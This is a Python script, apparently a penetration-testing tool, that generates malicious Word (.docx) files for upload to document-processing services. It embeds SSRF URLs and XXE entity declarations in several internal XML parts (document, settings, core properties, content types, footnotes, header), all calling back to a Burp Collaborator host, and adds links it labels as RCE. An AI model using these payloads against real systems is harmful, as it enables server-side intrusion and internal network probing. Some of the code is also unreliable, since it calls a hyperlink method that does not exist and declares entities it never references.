import zipfile
import shutil
from pathlib import Path
from docx import Document
import xml.etree.ElementTree as ET

def generate_docx_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    
    ssrf_payloads = [
        f"http://{burp_collab}/ssrf1",
        f"https://{burp_collab}/ssrf2",
        f"http://127.0.0.1@{burp_collab}/ssrf3",
        f"http://localhost@{burp_collab}/ssrf4",
        f"file://{burp_collab}/ssrf5",
        f"gopher://{burp_collab}/ssrf6",
    ]
    
    xxe_payloads = [
        f'<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe1">',
        f'<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe2">',
        f'<!ENTITY xxe SYSTEM "file://{burp_collab}/xxe3">',
        f'<!ENTITY % xxe SYSTEM "http://{burp_collab}/xxe4">',
        f'<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe5">]>',
        f'<!ENTITY % remote SYSTEM "http://{burp_collab}/xxe6">',
        f'<!ENTITY % int "<!ENTITY &#37; trick SYSTEM \'http://{burp_collab}/xxe7\'>">',
    ]
    
    rce_payloads = [
        f"http://{burp_collab}/rce1",
        f"https://{burp_collab}/rce2",
    ]
    
    for i, payload in enumerate(ssrf_payloads, 1):
        doc = Document()
        doc.add_paragraph(payload)
        output_file = output_dir / f"docx_ssrf_{i}.docx"
        doc.save(output_file)
    
    for i, payload in enumerate(xxe_payloads, 1):
        doc = Document()
        doc.add_paragraph('Test')
        
        docx_path = output_dir / f"docx_xxe_{i}.docx"
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            zip_ref.extractall(output_dir / f"temp_xxe_{i}")
        
        document_xml_path = output_dir / f"temp_xxe_{i}" / "word" / "document.xml"
        if document_xml_path.exists():
            tree = ET.parse(document_xml_path)
            root = tree.getroot()
            
            doctype = f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{payload}">]>'
            xml_str = ET.tostring(root, encoding='unicode')
            xml_with_xxe = doctype + '\n' + xml_str
            
            with open(document_xml_path, 'w', encoding='utf-8') as f:
                f.write(xml_with_xxe)
            
            with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                temp_dir = output_dir / f"temp_xxe_{i}"
                for file_path in temp_dir.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_dir)
                        zip_ref.write(file_path, arcname)
        
        shutil.rmtree(output_dir / f"temp_xxe_{i}", ignore_errors=True)
    
    xxe_in_document = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_document">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p>
<w:r>
<w:t>test</w:t>
</w:r>
</w:p>
</w:body>
</w:document>'''
    
    doc = Document()
    doc.add_paragraph('Test')
    docx_path = output_dir / "docx_xxe_document.docx"
    doc.save(docx_path)
    
    with zipfile.ZipFile(docx_path, 'r') as zip_ref:
        zip_ref.extractall(output_dir / "temp_xxe_document")
    
    document_xml_path = output_dir / "temp_xxe_document" / "word" / "document.xml"
    if document_xml_path.exists():
        with open(document_xml_path, 'w', encoding='utf-8') as f:
            f.write(xxe_in_document)
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            temp_dir = output_dir / "temp_xxe_document"
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
    
    shutil.rmtree(output_dir / "temp_xxe_document", ignore_errors=True)
    
    xxe_in_settings = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE settings [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_settings">
]>
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:zoom w:percent="100"/>
</w:settings>'''
    
    doc = Document()
    doc.add_paragraph('Test')
    docx_path = output_dir / "docx_xxe_settings.docx"
    doc.save(docx_path)
    
    with zipfile.ZipFile(docx_path, 'r') as zip_ref:
        zip_ref.extractall(output_dir / "temp_xxe_settings")
    
    settings_xml_path = output_dir / "temp_xxe_settings" / "word" / "settings.xml"
    if settings_xml_path.exists():
        with open(settings_xml_path, 'w', encoding='utf-8') as f:
            f.write(xxe_in_settings)
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            temp_dir = output_dir / "temp_xxe_settings"
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
    
    shutil.rmtree(output_dir / "temp_xxe_settings", ignore_errors=True)
    
    for i, payload in enumerate(rce_payloads, 1):
        doc = Document()
        hyperlink = doc.add_paragraph()
        hyperlink.add_run().add_hyperlink(payload, 'Click me')
        output_file = output_dir / f"docx_rce_{i}.docx"
        doc.save(output_file)
    
    xxe_in_core = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cp:coreProperties [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_core">
]>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<dc:title>Test</dc:title>
</cp:coreProperties>'''
    
    doc = Document()
    doc.add_paragraph('Test')
    docx_path = output_dir / "docx_xxe_core.docx"
    doc.save(docx_path)
    
    with zipfile.ZipFile(docx_path, 'r') as zip_ref:
        zip_ref.extractall(output_dir / "temp_xxe_core")
    
    core_path = output_dir / "temp_xxe_core" / "docProps" / "core.xml"
    if core_path.exists():
        with open(core_path, 'w', encoding='utf-8') as f:
            f.write(xxe_in_core)
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            temp_dir = output_dir / "temp_xxe_core"
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
    
    shutil.rmtree(output_dir / "temp_xxe_core", ignore_errors=True)
    
    xxe_in_content_types = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE Types [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_content_types">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''
    
    doc = Document()
    doc.add_paragraph('Test')
    docx_path = output_dir / "docx_xxe_content_types.docx"
    doc.save(docx_path)
    
    with zipfile.ZipFile(docx_path, 'r') as zip_ref:
        zip_ref.extractall(output_dir / "temp_xxe_content_types")
    
    content_types_path = output_dir / "temp_xxe_content_types" / "[Content_Types].xml"
    if content_types_path.exists():
        with open(content_types_path, 'w', encoding='utf-8') as f:
            f.write(xxe_in_content_types)
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            temp_dir = output_dir / "temp_xxe_content_types"
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
    
    shutil.rmtree(output_dir / "temp_xxe_content_types", ignore_errors=True)
    
    xxe_in_footnotes = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:footnotes [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_footnotes">
]>
<w:footnotes xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:footnote w:id="0" w:type="separator">
<w:p>
<w:r>
<w:t>test</w:t>
</w:r>
</w:p>
</w:footnote>
</w:footnotes>'''
    
    doc = Document()
    doc.add_paragraph('Test')
    docx_path = output_dir / "docx_xxe_footnotes.docx"
    doc.save(docx_path)
    
    with zipfile.ZipFile(docx_path, 'r') as zip_ref:
        zip_ref.extractall(output_dir / "temp_xxe_footnotes")
    
    footnotes_path = output_dir / "temp_xxe_footnotes" / "word" / "footnotes.xml"
    if footnotes_path.exists():
        with open(footnotes_path, 'w', encoding='utf-8') as f:
            f.write(xxe_in_footnotes)
    else:
        (output_dir / "temp_xxe_footnotes" / "word").mkdir(exist_ok=True)
        with open(footnotes_path, 'w', encoding='utf-8') as f:
            f.write(xxe_in_footnotes)
    
    with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
        temp_dir = output_dir / "temp_xxe_footnotes"
        for file_path in temp_dir.rglob('*'):
            if file_path.is_file():
                arcname = file_path.relative_to(temp_dir)
                zip_ref.write(file_path, arcname)
    
    shutil.rmtree(output_dir / "temp_xxe_footnotes", ignore_errors=True)
    
    xxe_in_header = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:hdr [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_header">
]>
<w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:p>
<w:r>
<w:t>Header</w:t>
</w:r>
</w:p>
</w:hdr>'''
    
    doc = Document()
    doc.add_paragraph('Test')
    docx_path = output_dir / "docx_xxe_header.docx"
    doc.save(docx_path)
    
    with zipfile.ZipFile(docx_path, 'r') as zip_ref:
        zip_ref.extractall(output_dir / "temp_xxe_header")
    
    header_path = output_dir / "temp_xxe_header" / "word" / "header1.xml"
    if not header_path.exists():
        (output_dir / "temp_xxe_header" / "word").mkdir(exist_ok=True)
    
    with open(header_path, 'w', encoding='utf-8') as f:
        f.write(xxe_in_header)
    
    with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
        temp_dir = output_dir / "temp_xxe_header"
        for file_path in temp_dir.rglob('*'):
            if file_path.is_file():
                arcname = file_path.relative_to(temp_dir)
                zip_ref.write(file_path, arcname)
    
    shutil.rmtree(output_dir / "temp_xxe_header", ignore_errors=True)

